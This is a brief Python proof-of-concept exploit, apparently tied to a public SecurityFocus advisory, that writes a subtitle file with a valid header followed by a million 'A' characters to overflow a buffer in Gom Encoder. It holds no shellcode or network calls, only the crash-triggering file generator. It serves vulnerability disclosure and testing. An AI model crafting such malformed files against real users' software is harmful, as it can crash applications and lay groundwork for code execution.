#exploit.py
#
# Gom Encoder (Subtitle File) Buffer Overflow PoC
# by :Encrypt3d.M!nd
#
#  Orignal Advisory:
#  http://www.securityfocus.com/bid/34120
#

chars = 'A' * 1000000

file = open ( 'devil_inside.srt', 'w' )
file.write ('1\n00:00:00,001 --> 00:00:06,000\n'+chars)
file.close()

